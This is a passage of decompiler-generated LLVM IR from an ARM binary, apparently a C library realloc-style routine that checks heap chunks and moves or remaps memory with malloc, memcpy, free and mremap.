  %v0_13e74 = load i32, i32* @r6, align 4
  store i32 %v0_13e74, i32* @r4, align 4
  br label %dec_label_pc_141c8

dec_label_pc_13e7c:                               ; preds = %dec_label_pc_13e68
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_13e84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 108) to i32*), align 4
  store i32 %v4_13e84, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_13e84, i32* %r2.global-to-local, align 4
  %v4_13e90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 68) to i32*), align 4
  store i32 %v4_13e90, i32* %r1.global-to-local, align 4
  %v2_13e94 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_13e94, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_13e9c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13e9c)
  %v0_13ea8 = load i32, i32* @r4, align 4
  store i32 %v0_13ea8, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r1.global-to-local, align 4
  %v4_13eb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_13ec0.590 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13eb4)
  %v0_13ec0 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_13ec0, -32
  br i1 %tmp36, label %dec_label_pc_13ee4, label %dec_label_pc_13ec8

dec_label_pc_13ec8:                               ; preds = %dec_label_pc_13e7c
  store i32 62712, i32* %r2.global-to-local, align 4
  %v0_13ecc = call i32 @__aeabi_read_tp()
  store i32 %v0_13ecc, i32* %r0.global-to-local, align 4
  %v3_13ed0 = load i16, i16* @global_var_233d0.483, align 2
  %v4_13ed0 = sext i16 %v3_13ed0 to i32
  store i32 %v4_13ed0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_13edc = add i32 %v4_13ed0, %v0_13ecc
  %v4_13edc = inttoptr i32 %v3_13edc to i32*
  store i32 12, i32* %v4_13edc, align 4
  br label %dec_label_pc_141c8

dec_label_pc_13ee4:                               ; preds = %dec_label_pc_13e7c
  %v1_13ee4 = add i32 %v0_13ec0, 11
  store i32 %v1_13ee4, i32* %r0.global-to-local, align 4
  %v0_13ee8 = load i32, i32* @r5, align 4
  %v1_13ee8 = add i32 %v0_13ee8, -4
  %v2_13ee8 = inttoptr i32 %v1_13ee8 to i32*
  %v3_13ee8 = load i32, i32* %v2_13ee8, align 4
  store i32 %v3_13ee8, i32* %r2.global-to-local, align 4
  %v2_13eec = icmp ugt i32 %v1_13ee4, 14
  %v7_13eec = icmp eq i32 %v1_13ee4, 15
  %v2_13ef0 = xor i1 %v2_13eec, true
  %v3_13ef0 = or i1 %v7_13eec, %v2_13ef0
  br i1 %v3_13ef0, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_13ee4
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_13ee4, %bb
  %v2_13ef4 = xor i1 %v7_13eec, true
  %v3_13ef4 = and i1 %v2_13eec, %v2_13ef4
  br i1 %v3_13ef4, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_13ef4 = and i32 %v1_13ee4, -8
  store i32 %v5_13ef4, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_13ef8 = and i32 %v3_13ee8, 2
  %v2_13ef8 = icmp eq i32 %v1_13ef8, 0
  %v1_13efc = add i32 %v0_13ee8, -8
  store i32 %v1_13efc, i32* @sl, align 4
  %v1_13f00 = and i32 %v3_13ee8, -4
  store i32 %v1_13f00, i32* @r6, align 4
  br i1 %v2_13ef8, label %dec_label_pc_13f08, label %dec_label_pc_140e0

dec_label_pc_13f08:                               ; preds = %bb29
  %v1_13f08 = load i32, i32* @sb, align 4
  %v3_13f08 = icmp ult i32 %v1_13f00, %v1_13f08
  br i1 %v3_13f08, label %dec_label_pc_13f14, label %bb30

bb30:                                             ; preds = %dec_label_pc_13f08
  store i32 %v1_13f00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14078

dec_label_pc_13f14:                               ; preds = %dec_label_pc_13f08
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_13f1c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v4_13f1c, i32* %r0.global-to-local, align 4
  %v1_13f20 = add i32 %v4_13f1c, 44
  %v2_13f20 = inttoptr i32 %v1_13f20 to i32*
  %v3_13f20 = load i32, i32* %v2_13f20, align 4
  store i32 %v3_13f20, i32* %r3.global-to-local, align 4
  %v2_13f24 = add i32 %v1_13f00, %v1_13efc
  store i32 %v2_13f24, i32* @r4, align 4
  %v9_13f28 = icmp eq i32 %v2_13f24, %v3_13f20
  %v1_13f2c = add i32 %v2_13f24, 4
  %v2_13f2c = inttoptr i32 %v1_13f2c to i32*
  %v3_13f2c = load i32, i32* %v2_13f2c, align 4
  store i32 %v3_13f2c, i32* %r1.global-to-local, align 4
  br i1 %v9_13f28, label %dec_label_pc_13f34, label %dec_label_pc_13f70

dec_label_pc_13f34:                               ; preds = %dec_label_pc_13f14
  %v1_13f34 = and i32 %v3_13f2c, -4
  %v2_13f38 = add i32 %v1_13f34, %v1_13f00
  store i32 %v2_13f38, i32* %r1.global-to-local, align 4
  %v1_13f3c = add i32 %v1_13f08, 16
  store i32 %v1_13f3c, i32* %r3.global-to-local, align 4
  %v3_13f40 = icmp ult i32 %v2_13f38, %v1_13f3c
  br i1 %v3_13f40, label %dec_label_pc_13fc4, label %dec_label_pc_13f48

dec_label_pc_13f48:                               ; preds = %dec_label_pc_13f34
  %v2_13f48 = sub i32 %v2_13f38, %v1_13f08
  %v1_13f4c = urem i32 %v3_13ee8, 2
  %v2_13f50 = add i32 %v1_13f08, %v1_13efc
  store i32 %v2_13f50, i32* %r1.global-to-local, align 4
  %v2_13f54 = or i32 %v1_13f08, %v1_13f4c
  store i32 %v2_13f54, i32* %r2.global-to-local, align 4
  %v1_13f58 = or i32 %v2_13f48, 1
  store i32 %v1_13f58, i32* %r3.global-to-local, align 4
  store i32 %v0_13ee8, i32* @r4, align 4
  store i32 %v2_13f54, i32* %v2_13ee8, align 4
  %v0_13f64 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f64 = load i32, i32* %r0.global-to-local, align 4
  %v2_13f64 = add i32 %v1_13f64, 44
  %v3_13f64 = inttoptr i32 %v2_13f64 to i32*
  store i32 %v0_13f64, i32* %v3_13f64, align 4
  %v0_13f68 = load i32, i32* %r3.global-to-local, align 4
  %v1_13f68 = load i32, i32* %r1.global-to-local, align 4
  %v2_13f68 = add i32 %v1_13f68, 4
  %v3_13f68 = inttoptr i32 %v2_13f68 to i32*
  store i32 %v0_13f68, i32* %v3_13f68, align 4
  br label %dec_label_pc_141ac

dec_label_pc_13f70:                               ; preds = %dec_label_pc_13f14
  %v1_13f70 = and i32 %v3_13f2c, -2
  %v2_13f74 = add i32 %v1_13f70, %v2_13f24
  store i32 %v2_13f74, i32* %r3.global-to-local, align 4
  %v1_13f78 = add i32 %v2_13f74, 4
  %v2_13f78 = inttoptr i32 %v1_13f78 to i32*
  %v3_13f78 = load i32, i32* %v2_13f78, align 4
  store i32 %v3_13f78, i32* %r3.global-to-local, align 4
  %v1_13f7c = urem i32 %v3_13f78, 2
  %v2_13f7c = icmp eq i32 %v1_13f7c, 0
  br i1 %v2_13f7c, label %dec_label_pc_13f84, label %dec_label_pc_13fc4

dec_label_pc_13f84:                               ; preds = %dec_label_pc_13f70
  %v1_13f84 = and i32 %v3_13f2c, -4
  store i32 %v1_13f84, i32* %r3.global-to-local, align 4
  %v2_13f88 = add i32 %v1_13f84, %v1_13f00
  store i32 %v2_13f88, i32* %r0.global-to-local, align 4
  %v3_13f8c = icmp ult i32 %v2_13f88, %v1_13f08
  br i1 %v3_13f8c, label %dec_label_pc_13fc4, label %dec_label_pc_13f94

dec_label_pc_13f94:                               ; preds = %dec_label_pc_13f84
  %v1_13f94 = add i32 %v1_13f00, %v0_13ee8
  %v2_13f94 = inttoptr i32 %v1_13f94 to i32*
  %v3_13f94 = load i32, i32* %v2_13f94, align 4
  store i32 %v3_13f94, i32* %r1.global-to-local, align 4
  %v1_13f98 = add i32 %v3_13f94, 12
  %v2_13f98 = inttoptr i32 %v1_13f98 to i32*
  %v3_13f98 = load i32, i32* %v2_13f98, align 4
  store i32 %v3_13f98, i32* %r3.global-to-local, align 4
  %v9_13f9c = icmp eq i32 %v3_13f98, %v2_13f24
  %v1_13fa0 = add i32 %v2_13f24, 12
  %v2_13fa0 = inttoptr i32 %v1_13fa0 to i32*
  %v3_13fa0 = load i32, i32* %v2_13fa0, align 4
  store i32 %v3_13fa0, i32* %r2.global-to-local, align 4
  br i1 %v9_13f9c, label %dec_label_pc_13fa8, label %dec_label_pc_13fb4

dec_label_pc_13fa8:                               ; preds = %dec_label_pc_13f94
  %v1_13fa8 = add i32 %v3_13fa0, 8
  %v2_13fa8 = inttoptr i32 %v1_13fa8 to i32*
  %v3_13fa8 = load i32, i32* %v2_13fa8, align 4
  store i32 %v3_13fa8, i32* %r3.global-to-local, align 4
  %v9_13fac = icmp eq i32 %v3_13fa8, %v2_13f24
  br i1 %v9_13fac, label %dec_label_pc_13fb8, label %dec_label_pc_13fb4

dec_label_pc_13fb4:                               ; preds = %dec_label_pc_13f94, %dec_label_pc_13fa8
  %v0_13fb4 = call i32 @abort()
  store i32 %v0_13fb4, i32* %r0.global-to-local, align 4
  %v0_13fb8.pre = load i32, i32* @r1, align 4
  %v1_13fb8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_13fb8

dec_label_pc_13fb8:                               ; preds = %dec_label_pc_13fa8, %dec_label_pc_13fb4
  %v1_13fb8 = phi i32 [ %v3_13fa0, %dec_label_pc_13fa8 ], [ %v1_13fb8.pre, %dec_label_pc_13fb4 ]
  %v0_13fb8 = phi i32 [ %v3_13f94, %dec_label_pc_13fa8 ], [ %v0_13fb8.pre, %dec_label_pc_13fb4 ]
  %v2_13fb8 = add i32 %v1_13fb8, 8
  %v3_13fb8 = inttoptr i32 %v2_13fb8 to i32*
  store i32 %v0_13fb8, i32* %v3_13fb8, align 4
  %v0_13fbc = load i32, i32* %r2.global-to-local, align 4
  %v1_13fbc = load i32, i32* %r1.global-to-local, align 4
  %v2_13fbc = add i32 %v1_13fbc, 12
  %v3_13fbc = inttoptr i32 %v2_13fbc to i32*
  store i32 %v0_13fbc, i32* %v3_13fbc, align 4
  %v1_14078.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14078

dec_label_pc_13fc4:                               ; preds = %dec_label_pc_13f34, %dec_label_pc_13f84, %dec_label_pc_13f70
  %v1_13fc4 = add i32 %v1_13f08, -7
  store i32 %v1_13fc4, i32* @r0, align 4
  %v0_13fc8 = call i32 @malloc()
  store i32 %v0_13fc8, i32* @r0, align 4
  store i32 %v0_13fc8, i32* %r1.global-to-local, align 4
  %v2_13fcc = icmp eq i32 %v0_13fc8, 0
  br i1 %v2_13fcc, label %bb31, label %dec_label_pc_13fd8

bb31:                                             ; preds = %dec_label_pc_13fc4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_141ac

dec_label_pc_13fd8:                               ; preds = %dec_label_pc_13fc4
  %v1_13fe0.pre = load i32, i32* @r4, align 4
  %v1_13fd8 = add i32 %v0_13fc8, -4
  %v2_13fd8 = inttoptr i32 %v1_13fd8 to i32*
  %v3_13fd8 = load i32, i32* %v2_13fd8, align 4
  store i32 %v3_13fd8, i32* @r3, align 4
  %v1_13fdc = add i32 %v0_13fc8, -8
  store i32 %v1_13fdc, i32* @r7, align 4
  %v9_13fe0 = icmp eq i32 %v1_13fdc, %v1_13fe0.pre
  br i1 %v9_13fe0, label %.thread2, label %dec_label_pc_13ff0

.thread2:                                         ; preds = %dec_label_pc_13fd8
  %v2_13fe4 = and i32 %v3_13fd8, -4
  store i32 %v2_13fe4, i32* %r3.global-to-local, align 4
  %v2_13fe8 = load i32, i32* @r6, align 4
  %v3_13fe8 = add i32 %v2_13fe8, %v2_13fe4
  store i32 %v3_13fe8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14078

dec_label_pc_13ff0:                               ; preds = %dec_label_pc_13fd8
  %v0_13ff0 = load i32, i32* @r6, align 4
  %v1_13ff0 = add i32 %v0_13ff0, -4
  store i32 %v1_13ff0, i32* @r2, align 4
  %v3_13ff4 = udiv i32 %v1_13ff0, 4
  store i32 %v3_13ff4, i32* @ip, align 4
  %tmp37 = and i32 %v1_13ff0, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_13ffc = icmp ult i32 %v1_13ff0, 36
  %v3_13ffc = or i1 %tmp38, %v2_13ffc
  %v0_1400c = load i32, i32* @r5, align 4
  br i1 %v3_13ffc, label %dec_label_pc_1400c, label %dec_label_pc_14000

dec_label_pc_14000:                               ; preds = %dec_label_pc_13ff0
  store i32 %v0_1400c, i32* @r1, align 4
  %v0_14004 = call i32 @memcpy()
  store i32 %v0_14004, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1400c:                               ; preds = %dec_label_pc_13ff0
  %v1_1400c = inttoptr i32 %v0_1400c to i32*
  %v2_1400c = load i32, i32* %v1_1400c, align 4
  store i32 %v2_1400c, i32* %r3.global-to-local, align 4
  %v2_14010 = inttoptr i32 %v0_13fc8 to i32*
  store i32 %v2_1400c, i32* %v2_14010, align 4
  %v0_14014 = load i32, i32* @r5, align 4
  %v1_14014 = add i32 %v0_14014, 4
  %v2_14014 = inttoptr i32 %v1_14014 to i32*
  %v3_14014 = load i32, i32* %v2_14014, align 4
  store i32 %v3_14014, i32* %r3.global-to-local, align 4
  %v1_14018 = load i32, i32* %r1.global-to-local, align 4
  %v2_14018 = add i32 %v1_14018, 4
  %v3_14018 = inttoptr i32 %v2_14018 to i32*
  store i32 %v3_14014, i32* %v3_14018, align 4
  %v0_1401c = load i32, i32* @r5, align 4
  %v1_1401c = add i32 %v0_1401c, 8
  %v2_1401c = inttoptr i32 %v1_1401c to i32*
  %v3_1401c = load i32, i32* %v2_1401c, align 4
  store i32 %v3_1401c, i32* %r3.global-to-local, align 4
  %v0_14020 = load i32, i32* @ip, align 4
  %v1_14024 = load i32, i32* %r1.global-to-local, align 4
  %v2_14024 = add i32 %v1_14024, 8
  %v3_14024 = inttoptr i32 %v2_14024 to i32*
  store i32 %v3_1401c, i32* %v3_14024, align 4
  %tmp39 = icmp ult i32 %v0_14020, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_1402c

dec_label_pc_1402c:                               ; preds = %dec_label_pc_1400c
  %v0_1402c = load i32, i32* @r5, align 4
  %v1_1402c = add i32 %v0_1402c, 12
  %v2_1402c = inttoptr i32 %v1_1402c to i32*
  %v3_1402c = load i32, i32* %v2_1402c, align 4
  store i32 %v3_1402c, i32* %r3.global-to-local, align 4
  %v1_14030 = load i32, i32* %r1.global-to-local, align 4
  %v2_14030 = add i32 %v1_14030, 12
  %v3_14030 = inttoptr i32 %v2_14030 to i32*
  store i32 %v3_1402c, i32* %v3_14030, align 4
  %v0_14034 = load i32, i32* @r5, align 4
  %v1_14034 = add i32 %v0_14034, 16
  %v2_14034 = inttoptr i32 %v1_14034 to i32*
  %v3_14034 = load i32, i32* %v2_14034, align 4
  store i32 %v3_14034, i32* %r3.global-to-local, align 4
  %v0_14038 = load i32, i32* @ip, align 4
  %v1_1403c = load i32, i32* %r1.global-to-local, align 4
  %v2_1403c = add i32 %v1_1403c, 16
  %v3_1403c = inttoptr i32 %v2_1403c to i32*
  store i32 %v3_14034, i32* %v3_1403c, align 4
  %tmp40 = icmp ult i32 %v0_14038, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_14044

dec_label_pc_14044:                               ; preds = %dec_label_pc_1402c
  %v0_14044 = load i32, i32* @r5, align 4
  %v1_14044 = add i32 %v0_14044, 20
  %v2_14044 = inttoptr i32 %v1_14044 to i32*
  %v3_14044 = load i32, i32* %v2_14044, align 4
  store i32 %v3_14044, i32* %r3.global-to-local, align 4
  %v1_14048 = load i32, i32* %r1.global-to-local, align 4
  %v2_14048 = add i32 %v1_14048, 20
  %v3_14048 = inttoptr i32 %v2_14048 to i32*
  store i32 %v3_14044, i32* %v3_14048, align 4
  %v0_1404c = load i32, i32* @r5, align 4
  %v1_1404c = add i32 %v0_1404c, 24
  %v2_1404c = inttoptr i32 %v1_1404c to i32*
  %v3_1404c = load i32, i32* %v2_1404c, align 4
  store i32 %v3_1404c, i32* %r3.global-to-local, align 4
  %v1_14050 = load i32, i32* %r1.global-to-local, align 4
  %v2_14050 = add i32 %v1_14050, 24
  %v3_14050 = inttoptr i32 %v2_14050 to i32*
  store i32 %v3_1404c, i32* %v3_14050, align 4
  %v0_14054 = load i32, i32* @ip, align 4
  %v7_14054 = icmp eq i32 %v0_14054, 9
  br i1 %v7_14054, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_14044
  %v1_14058 = load i32, i32* @r5, align 4
  %v2_14058 = add i32 %v1_14058, 28
  %v3_14058 = inttoptr i32 %v2_14058 to i32*
  %v4_14058 = load i32, i32* %v3_14058, align 4
  store i32 %v4_14058, i32* %r3.global-to-local, align 4
  %v2_1405c = load i32, i32* %r1.global-to-local, align 4
  %v3_1405c = add i32 %v2_1405c, 28
  %v4_1405c = inttoptr i32 %v3_1405c to i32*
  store i32 %v4_14058, i32* %v4_1405c, align 4
  %v1_14060 = load i32, i32* @r5, align 4
  %v2_14060 = add i32 %v1_14060, 32
  %v3_14060 = inttoptr i32 %v2_14060 to i32*
  %v4_14060 = load i32, i32* %v3_14060, align 4
  store i32 %v4_14060, i32* %r3.global-to-local, align 4
  %v2_14064 = load i32, i32* %r1.global-to-local, align 4
  %v3_14064 = add i32 %v2_14064, 32
  %v4_14064 = inttoptr i32 %v3_14064 to i32*
  store i32 %v4_14060, i32* %v4_14064, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_14044, %dec_label_pc_1402c, %dec_label_pc_1400c, %dec_label_pc_14000, %bb32
  %v0_14068 = load i32, i32* @r5, align 4
  store i32 %v0_14068, i32* @r0, align 4
  %v0_1406c = call i32 @free()
  store i32 %v0_1406c, i32* %r0.global-to-local, align 4
  %v0_14070 = load i32, i32* @r7, align 4
  %v1_14070 = add i32 %v0_14070, 8
  store i32 %v1_14070, i32* @r4, align 4
  br label %dec_label_pc_141ac

dec_label_pc_14078:                               ; preds = %bb30, %.thread2, %dec_label_pc_13fb8
  %v0_1408c = phi i32 [ %v3_13fe8, %.thread2 ], [ %v1_13f00, %bb30 ], [ %v1_14078.pre, %dec_label_pc_13fb8 ]
  %v0_14078 = load i32, i32* @sb, align 4
  %v2_14078 = sub i32 %v0_1408c, %v0_14078
  store i32 %v2_14078, i32* %r1.global-to-local, align 4
  %v0_14080 = load i32, i32* @sl, align 4
  %v1_14080 = add i32 %v0_14080, 4
  %v2_14080 = inttoptr i32 %v1_14080 to i32*
  %v3_14080 = load i32, i32* %v2_14080, align 4
  %tmp41 = icmp ugt i32 %v2_14078, 15
  %v1_140a8 = urem i32 %v3_14080, 2
  store i32 %v1_140a8, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_140a8, label %dec_label_pc_14088

dec_label_pc_14088:                               ; preds = %dec_label_pc_14078
  %v2_1408c = or i32 %v1_140a8, %v0_1408c
  store i32 %v2_1408c, i32* %r3.global-to-local, align 4
  store i32 %v2_1408c, i32* %v2_14080, align 4
  %v0_14094 = load i32, i32* @sl, align 4
  %v1_14094 = load i32, i32* %r0.global-to-local, align 4
  %v2_14094 = add i32 %v1_14094, %v0_14094
  store i32 %v2_14094, i32* %r2.global-to-local, align 4
  %v1_14098 = add i32 %v2_14094, 4
  %v2_14098 = inttoptr i32 %v1_14098 to i32*
  %v3_14098 = load i32, i32* %v2_14098, align 4
  %v1_1409c = or i32 %v3_14098, 1
  store i32 %v1_1409c, i32* %r3.global-to-local, align 4
  store i32 %v1_1409c, i32* %v2_14098, align 4
  br label %dec_label_pc_140d8

dec_label_pc_140a8:                               ; preds = %dec_label_pc_14078
  %v2_140ac = add i32 %v0_14080, %v0_14078
  store i32 %v2_140ac, i32* %r0.global-to-local, align 4
  %v2_140b0 = or i32 %v1_140a8, %v0_14078
  store i32 %v2_140b0, i32* %r3.global-to-local, align 4
  %v1_140b4 = or i32 %v2_14078, 1
  store i32 %v1_140b4, i32* %r2.global-to-local, align 4
  store i32 %v2_140b0, i32* %v2_14080, align 4
  %v0_140bc = load i32, i32* %r2.global-to-local, align 4
  %v1_140bc = load i32, i32* %r0.global-to-local, align 4
  %v2_140bc = add i32 %v1_140bc, 4
  %v3_140bc = inttoptr i32 %v2_140bc to i32*
  store i32 %v0_140bc, i32* %v3_140bc, align 4
  %v0_140c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_140c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_140c0 = add i32 %v1_140c0, %v0_140c0
  store i32 %v2_140c0, i32* %r2.global-to-local, align 4
  %v1_140c4 = add i32 %v2_140c0, 4
  %v2_140c4 = inttoptr i32 %v1_140c4 to i32*
  %v3_140c4 = load i32, i32* %v2_140c4, align 4
  %v1_140c8 = or i32 %v3_140c4, 1
  store i32 %v1_140c8, i32* %r3.global-to-local, align 4
  store i32 %v1_140c8, i32* %v2_140c4, align 4
  %v0_140d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_140d0 = add i32 %v0_140d0, 8
  store i32 %v1_140d0, i32* @r0, align 4
  %v0_140d4 = call i32 @free()
  store i32 %v0_140d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_140d8

dec_label_pc_140d8:                               ; preds = %dec_label_pc_14088, %dec_label_pc_140a8
  %v0_140d8 = load i32, i32* @sl, align 4
  %v1_140d8 = add i32 %v0_140d8, 8
  store i32 %v1_140d8, i32* @r4, align 4
  br label %dec_label_pc_141ac

dec_label_pc_140e0:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r1.global-to-local, align 4
  %v4_140e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v4_140e8, i32* @r8, align 4
  %v2_140ec = inttoptr i32 %v1_13efc to i32*
  %v3_140ec = load i32, i32* %v2_140ec, align 4
  store i32 %v3_140ec, i32* @r4, align 4
  %v1_140f0 = add i32 %v4_140e8, 860
  %v2_140f0 = inttoptr i32 %v1_140f0 to i32*
  %v3_140f0 = load i32, i32* %v2_140f0, align 4
  %v1_140f4 = add i32 %v3_140ec, 4
  %v1_140f8 = add i32 %v3_140f0, -1
  store i32 %v1_140f8, i32* %r2.global-to-local, align 4
  %v2_140fc = add i32 %v1_140f4, %v1_140f8
  %v1_14100 = load i32, i32* @sb, align 4
  %v2_14100 = add i32 %v2_140fc, %v1_14100
  store i32 %v2_14100, i32* %r3.global-to-local, align 4
  %v2_14104 = sub i32 0, %v3_140f0
  %v3_14104 = and i32 %v2_14100, %v2_14104
  store i32 %v3_14104, i32* @r7, align 4
  %v2_14108 = sub i32 %v3_14104, %v3_140ec
  store i32 %v2_14108, i32* @fp, align 4
  %v9_1410c = icmp eq i32 %v1_13f00, %v2_14108
  br i1 %v9_1410c, label %dec_label_pc_14180, label %dec_label_pc_14114

dec_label_pc_14114:                               ; preds = %dec_label_pc_140e0
  %v2_14114 = sub i32 %v1_13efc, %v3_140ec
  store i32 %v2_14114, i32* %r0.global-to-local, align 4
  %v2_14118 = add i32 %v3_140ec, %v1_13f00
  store i32 %v2_14118, i32* %r1.global-to-local, align 4
  store i32 %v3_14104, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_14124 = call i32 @mremap(i32 %v2_14114, i32 %v2_14118, i32 %v3_14104, i32 1)
  store i32 %v4_14124, i32* %r0.global-to-local, align 4
  %v7_14128 = icmp eq i32 %v4_14124, -1
  br i1 %v7_14128, label %dec_label_pc_14174, label %dec_label_pc_14130

dec_label_pc_14130:                               ; preds = %dec_label_pc_14114
  %v1_14130 = load i32, i32* @r4, align 4
  %v2_14130 = add i32 %v1_14130, %v4_14124
  store i32 %v2_14130, i32* %r0.global-to-local, align 4
  %v0_14134 = load i32, i32* @fp, align 4
  %v1_14134 = or i32 %v0_14134, 2
  store i32 %v1_14134, i32* %r3.global-to-local, align 4
  %v2_14138 = add i32 %v2_14130, 4
  %v3_14138 = inttoptr i32 %v2_14138 to i32*
  store i32 %v1_14134, i32* %v3_14138, align 4
  %v0_1413c = load i32, i32* @r8, align 4
  %v1_1413c = add i32 %v0_1413c, 868
  %v2_1413c = inttoptr i32 %v1_1413c to i32*
  %v3_1413c = load i32, i32* %v2_1413c, align 4
  store i32 %v3_1413c, i32* %r3.global-to-local, align 4
  %v1_14140 = add i32 %v0_1413c, 880
  %v2_14140 = inttoptr i32 %v1_14140 to i32*
  %v3_14140 = load i32, i32* %v2_14140, align 4
  store i32 %v3_14140, i32* %r2.global-to-local, align 4
  %v0_14144 = load i32, i32* @r6, align 4
  %v2_14144 = sub i32 %v3_1413c, %v0_14144
  store i32 %v2_14144, i32* %r3.global-to-local, align 4
  %v1_14148 = load i32, i32* @r7, align 4
  %v2_14148 = add i32 %v1_14148, %v2_14144
  store i32 %v2_14148, i32* %r1.global-to-local, align 4
  %v1_1414c = add i32 %v0_1413c, 872
  %v2_1414c = inttoptr i32 %v1_1414c to i32*
  %v3_1414c = load i32, i32* %v2_1414c, align 4
  store i32 %v3_1414c, i32* %r3.global-to-local, align 4
  %v1_14154 = add i32 %v0_1413c, 884
  %v2_14154 = inttoptr i32 %v1_14154 to i32*
  %v3_14154 = load i32, i32* %v2_14154, align 4
  store i32 %v3_14154, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_14148, %v3_14140
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_14130
  store i32 %v2_14148, i32* %v2_14140, align 4
  %v0_1415c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1415c.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_14130, %bb33
  %v1_1415c = phi i32 [ %v0_1413c, %dec_label_pc_14130 ], [ %v1_1415c.pre, %bb33 ]
  %v0_1415c = phi i32 [ %v2_14148, %dec_label_pc_14130 ], [ %v0_1415c.pre, %bb33 ]
  %v2_1415c = add i32 %v1_1415c, 868
  %v3_1415c = inttoptr i32 %v2_1415c to i32*
  store i32 %v0_1415c, i32* %v3_1415c, align 4
  %v0_14160 = load i32, i32* %r1.global-to-local, align 4
  %v1_14160 = load i32, i32* %r3.global-to-local, align 4
  %v2_14160 = add i32 %v1_14160, %v0_14160
  store i32 %v2_14160, i32* %r1.global-to-local, align 4
  %v1_14164 = load i32, i32* %r2.global-to-local, align 4
  %v0_14168 = load i32, i32* %r0.global-to-local, align 4
  %v1_14168 = add i32 %v0_14168, 8
  store i32 %v1_14168, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_14160, %v1_14164
  br i1 %tmp43, label %bb35, label %dec_label_pc_141ac

bb35:                                             ; preds = %bb34
  %v5_1416c = load i32, i32* @r8, align 4
  %v6_1416c = add i32 %v5_1416c, 884
  %v7_1416c = inttoptr i32 %v6_1416c to i32*
  store i32 %v2_14160, i32* %v7_1416c, align 4
  br label %dec_label_pc_141ac

dec_label_pc_14174:                               ; preds = %dec_label_pc_14114
  %v0_14174 = load i32, i32* @sb, align 4
  %v1_14174 = add i32 %v0_14174, 4
  store i32 %v1_14174, i32* %r3.global-to-local, align 4
  %v0_14178 = load i32, i32* @r6, align 4
  %v3_14178 = icmp ult i32 %v0_14178, %v1_14174
  br i1 %v3_14178, label %dec_label_pc_14188, label %dec_label_pc_14174.dec_label_pc_14180_crit_edge

dec_label_pc_14174.dec_label_pc_14180_crit_edge:  ; preds = %dec_label_pc_14174
  %v0_14180.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14180

dec_label_pc_14180:                               ; preds = %dec_label_pc_14174.dec_label_pc_14180_crit_edge, %dec_label_pc_140e0
  %v0_14180 = phi i32 [ %v0_14180.pre, %dec_label_pc_14174.dec_label_pc_14180_crit_edge ], [ %v0_13ee8, %dec_label_pc_140e0 ]
  store i32 %v0_14180, i32* @r4, align 4
  br label %dec_label_pc_141ac

dec_label_pc_14188:                               ; preds = %dec_label_pc_14174
  %v1_14188 = add i32 %v0_14174, -7
  store i32 %v1_14188, i32* @r0, align 4
  %v0_1418c = call i32 @malloc()
  store i32 %v0_1418c, i32* @r0, align 4
  store i32 %v0_1418c, i32* @r4, align 4
  %v2_14190 = icmp eq i32 %v0_1418c, 0
  br i1 %v2_14190, label %dec_label_pc_141ac, label %dec_label_pc_14198

dec_label_pc_14198:                               ; preds = %dec_label_pc_14188
  %v0_14198 = load i32, i32* @r6, align 4
  %v1_14198 = add i32 %v0_14198, -8
  store i32 %v1_14198, i32* @r2, align 4
  %v0_1419c = load i32, i32* @r5, align 4
  store i32 %v0_1419c, i32* @r1, align 4
  %v0_141a0 = call i32 @memcpy()
